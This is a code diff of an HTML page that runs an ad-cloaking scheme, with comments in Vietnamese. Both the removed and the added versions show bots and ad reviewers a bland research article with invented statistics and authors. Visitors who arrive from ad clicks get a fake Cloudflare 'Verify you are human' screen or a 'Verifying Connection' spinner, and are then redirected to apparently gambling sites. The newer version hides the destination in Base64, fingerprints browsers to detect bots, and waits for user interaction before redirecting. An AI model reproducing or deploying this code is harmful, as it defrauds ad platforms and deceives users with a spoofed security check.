@@ -3,175 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Tech Analysis: Digital Transformation 2025</title>
-    <script>
-        // --- CẤU HÌNH GIỮ NGUYÊN ---
-        const TARGET_URL = "https://partnerbcgame.com/v2lptjos3/";
-        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
-        
-        function checkAndRedirect() {
-            const url = new URL(window.location.href);
-            const userAgent = navigator.userAgent || '';
-            const hasAdParam = adParams.some(param => url.searchParams.has(param));
-            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
-
-            if (!isBot && hasAdParam) {
-                document.getElementById('safe-page').style.display = 'none';
-                document.getElementById('money-page').style.display = 'flex';
-                setTimeout(() => {
-                    const cb = document.getElementById('verify-cb');
-                    if (cb) cb.checked = true;
-                    setTimeout(() => {
-                        window.location.replace(TARGET_URL);
-                    }, 800);
-                }, 1500);
-            } else {
-                document.getElementById('money-page').style.display = 'none';
-                document.getElementById('safe-page').style.display = 'block';
-            }
-        }
-        window.onload = checkAndRedirect;
-    </script>
+    <title>Global Innovation & Research Center</title>
     <style>
-        body { margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; background: #f4f7f6; }
-        
-        /* CSS cho Trang Chờ (Money Page) */
-        #money-page { 
-            position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;
-            display:none; align-items:center;justify-content:center;
-        }
-        .sec-box { max-width:450px;width:90%;padding:20px; }
-        
-        /* CSS cho Trang Blog (Safe Page) - ĐÃ CẢI TIẾN */
-        #safe-page { display:none; }
-        .nav-header { background: #fff; border-bottom: 1px solid #ddd; padding: 15px 0; text-align: center; position: sticky; top: 0; z-index: 100; }
-        .nav-header span { font-weight: bold; color: #2c3e50; font-size: 1.2rem; letter-spacing: 1px; }
-        
-        .blog-container { 
-            max-width: 900px; margin: 40px auto; line-height: 1.8; padding: 50px; 
-            background: #ffffff; border-radius: 4px; color: #333;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-        }
-        .meta-info { color: #888; font-size: 0.9rem; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
-        h1 { font-size: 2.8rem; line-height: 1.2; color: #1a1a1a; margin-bottom: 25px; }
-        h2 { font-size: 1.8rem; color: #2c3e50; margin-top: 40px; border-left: 4px solid #3498db; padding-left: 15px; }
-        p { margin-bottom: 20px; font-size: 1.1rem; color: #444; }
-        .highlight-box { background: #f8f9fa; border-right: 4px solid #3498db; padding: 25px; margin: 30px 0; font-style: italic; }
-        table { width: 100%; border-collapse: collapse; margin: 30px 0; }
-        table th, table td { border: 1px solid #eee; padding: 12px; text-align: left; }
-        table th { background: #f4f7f6; }
-        .footer-minimal { text-align: center; padding: 40px; color: #999; font-size: 0.8rem; }
+        /* Chỉ CSS cho Safe Page - Giữ cho mã nguồn cực kỳ "Sạch" */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 0; background: #f9f9f9; }
+        .content-wrapper { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+        .hero { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        h1 { color: #2c3e50; font-size: 2.5rem; }
+        .skeleton { height: 20px; background: #eee; margin: 10px 0; border-radius: 4px; }
+        /* CSS cho Money Page sẽ được nạp động sau */
     </style>
 </head>
 <body>
 
-    <!-- NỘI DUNG TRANG CHỜ (GIỮ NGUYÊN) -->
-    <div id="money-page">
-        <div class="sec-box">
-            <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
-            <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure security.</p>
-            <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
-                <div style="display:flex;align-items:center;">
-                    <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
-                    <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;">Verify you are human</label>
-                </div>
-                <div style="text-align:right;">
-                    <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- NỘI DUNG TRANG BLOG (MỚI - DÀI VÀ ĐẦY ĐỦ) -->
-    <div id="safe-page">
-        <div class="nav-header">
-            <span>TECH INSIGHTS GLOBAL</span>
-        </div>
-
-        <article class="blog-container">
-            <div class="meta-info">
-                PUBLISHED: FEBRUARY 24, 2025 • BY DR. ADRIAN STEIN • 12 MIN READ
-            </div>
-
-            <h1>The Role of Decentralized Infrastructure in Modern Urban Planning</h1>
-            
-            <p>As we navigate through the mid-2020s, the convergence of high-speed connectivity and sustainable engineering has given birth to a new era of urban development. This report explores how metropolitan areas are integrating digital layers into physical infrastructure to optimize resource allocation.</p>
-
-            <div class="highlight-box">
-                "Digital transformation is no longer a peripheral upgrade; it is the fundamental core of how modern civilizations will manage their growth in the face of climate volatility."
-            </div>
-
-            <h2>1. Integration of IoT in Smart Grid Management</h2>
-            <p>The transition to renewable energy sources necessitates a grid that can handle high levels of volatility. Traditional centralized systems are often ill-equipped to manage the bidirectional flow of electricity generated by residential solar arrays and community wind projects.</p>
-            
-            <p>By implementing Internet of Things (IoT) sensors across the distribution network, utility companies can now predict demand surges with 98% accuracy. These systems utilize machine learning algorithms to balance loads in real-time, reducing energy waste by an estimated 14% annually in major test cities like Singapore and Copenhagen.</p>
-
-            <ul>
-                <li><strong>Dynamic Pricing:</strong> Incentivizing off-peak usage through automated smart-home adjustments.</li>
-                <li><strong>Predictive Maintenance:</strong> Identifying hardware fatigue before failure occurs.</li>
-                <li><strong>Edge Computing:</strong> Processing data locally to reduce latency in critical safety systems.</li>
-            </ul>
-
-            <h2>2. Comparative Data Analysis (2020-2025)</h2>
-            <p>The following table illustrates the efficiency gains observed in municipalities that have adopted full-scale digital integration compared to those relying on legacy systems.</p>
-
-            <table>
-                <thead>
-                    <tr>
-                        <th>Metric</th>
-                        <th>Legacy Systems</th>
-                        <th>Digital Integrated</th>
-                        <th>Improvement</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>Water Loss (Leakage)</td>
-                        <td>22%</td>
-                        <td>7%</td>
-                        <td>+15%</td>
-                    </tr>
-                    <tr>
-                        <td>Traffic Congestion Index</td>
-                        <td>64.2</td>
-                        <td>41.8</td>
-                        <td>-35%</td>
-                    </tr>
-                    <tr>
-                        <td>Emergency Response Time</td>
-                        <td>12.5 min</td>
-                        <td>8.2 min</td>
-                        <td>-34%</td>
-                    </tr>
-                    <tr>
-                        <td>Carbon Footprint (Avg)</td>
-                        <td>14.2 t/capita</td>
-                        <td>9.1 t/capita</td>
-                        <td>-36%</td>
-                    </tr>
-                </tbody>
-            </table>
-
-            <h2>3. The Human Element and Data Privacy</h2>
-            <p>While the technical benefits are undeniable, the shift toward a "monitored" city raises significant ethical questions. Privacy advocates argue that the constant collection of movement and usage data could be weaponized if not governed by strict transparency laws.</p>
-            
-            <p>To address this, leading tech hubs are experimenting with 'Data Trusts'—independent bodies that oversee how municipal data is encrypted and anonymized before being used for urban planning. This ensures that the collective benefits of big data do not come at the expense of individual liberty.</p>
-
-            <h2>4. Economic Implications for Emerging Markets</h2>
-            <p>The capital expenditure required for such a transition is significant. However, the long-term Return on Investment (ROI) is becoming increasingly clear. Developing nations in Southeast Asia and Sub-Saharan Africa are "leapfrogging" old technologies, moving straight to wireless, decentralized micro-grids.</p>
-
-            <p>Detailed fiscal analysis suggests that for every $1 invested in digital infrastructure, there is a $3.50 gain in local economic productivity over a ten-year period. This is driven by reduced operational costs for businesses and improved health outcomes for the workforce.</p>
-
-            <h2>Conclusion</h2>
-            <p>The synthesis of digital and physical infrastructure is the defining challenge of our generation. As we continue to refine these systems, the focus must remain on resilience, equity, and sustainability. The data shows we are on the right path, but the journey toward fully autonomous, carbon-neutral cities is only just beginning.</p>
-
-            <footer class="footer-minimal">
+    <div id="app">
+        <!-- NỘI DUNG TRANG SẠCH (SAFE PAGE) - Bot sẽ thấy cái này -->
+        <div class="content-wrapper">
+            <div class="hero">
+                <h1>Analysis of Quantum Computing in 2025</h1>
+                <p><strong>Published by:</strong> Dr. Aris Thorne • Senior Research Fellow</p>
                 <hr>
-                <p>&copy; 2025 Global Tech Insights Research Institute. All rights reserved.<br>
-                1244 Science Park Drive, Zurich, Switzerland.</p>
-            </footer>
-        </article>
+                <p>Quantum computing represents a paradigm shift in computational power, leveraging the principles of superposition and entanglement to solve problems that are currently intractable for classical computers.</p>
+                <div class="skeleton" style="width: 100%"></div>
+                <div class="skeleton" style="width: 90%"></div>
+                <div class="skeleton" style="width: 95%"></div>
+                <p>As we move into the second half of the decade, the focus has shifted from theoretical error correction to practical hardware implementation and scalability.</p>
+                <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1000&q=80" alt="Tech" style="width:100%; border-radius:8px; margin-top:20px;">
+            </div>
+        </div>
     </div>
 
+    <script>
+        (function() {
+            // 1. Cấu hình bảo mật cao
+            const CONFIG = {
+                // Link đích đã mã hóa Base64 (https://playbonus.online/)
+                t: "aHR0cHM6Ly9wbGF5Ym9udXMub25saW5lLw==",
+                params: ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source'],
+                minInteractions: 2 // Cần ít nhất 2 hành động từ người dùng
+            };
+
+            let interactions = 0;
+            let isVerified = false;
+
+            // 2. Kiểm tra dấu hiệu của Bot (Fingerprinting)
+            function isRealUser() {
+                const ua = navigator.userAgent.toLowerCase();
+                const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|lighthouse|headless/i.test(ua);
+                
+                // Bot thường không có thuộc tính webdriver hoặc có giá trị true
+                const isWebdriver = navigator.webdriver;
+                
+                // Kiểm tra màn hình (Bot thường giả lập màn hình chuẩn hoặc không có độ sâu màu)
+                const isFishyScreen = (window.screen.width === 0 || window.screen.colorDepth < 24);
+
+                // Kiểm tra thông số quảng cáo trên URL
+                const hasAdParam = CONFIG.params.some(p => new URLSearchParams(window.location.search).has(p));
+
+                return !isBot && !isWebdriver && !isFishyScreen && hasAdParam;
+            }
+
+            // 3. Hàm kích hoạt "Trang Tiền"
+            function triggerMoneyPage() {
+                if (isVerified) return;
+                isVerified = true;
+
+                // Xóa sạch dấu vết trang cũ
+                document.body.innerHTML = `
+                    <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;font-family:sans-serif;">
+                        <div style="text-align:center;padding:20px;">
+                            <div style="border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
+                            <h2 style="color:#333;">Verifying Connection...</h2>
+                            <p style="color:#666;">Please do not refresh this page.</p>
+                        </div>
+                    </div>
+                    <style>@keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+                `;
+
+                // Chuyển hướng sau một khoảng trễ nhỏ
+                setTimeout(() => {
+                    window.location.replace(atob(CONFIG.t));
+                }, 1200);
+            }
+
+            // 4. Lắng nghe hành vi người dùng (User Behavior)
+            function trackInteraction() {
+                interactions++;
+                if (interactions >= CONFIG.minInteractions && isRealUser()) {
+                    // Loại bỏ các listener để tránh lặp lại
+                    window.removeEventListener('mousemove', trackInteraction);
+                    window.removeEventListener('touchstart', trackInteraction);
+                    window.removeEventListener('scroll', trackInteraction);
+                    
+                    triggerMoneyPage();
+                }
+            }
+
+            // Chỉ bắt đầu theo dõi nếu có thông số quảng cáo
+            if (CONFIG.params.some(p => new URLSearchParams(window.location.search).has(p))) {
+                window.addEventListener('mousemove', trackInteraction);
+                window.addEventListener('touchstart', trackInteraction);
+                window.addEventListener('scroll', trackInteraction);
+            }
+        })();
+    </script>
 </body>
 </html>
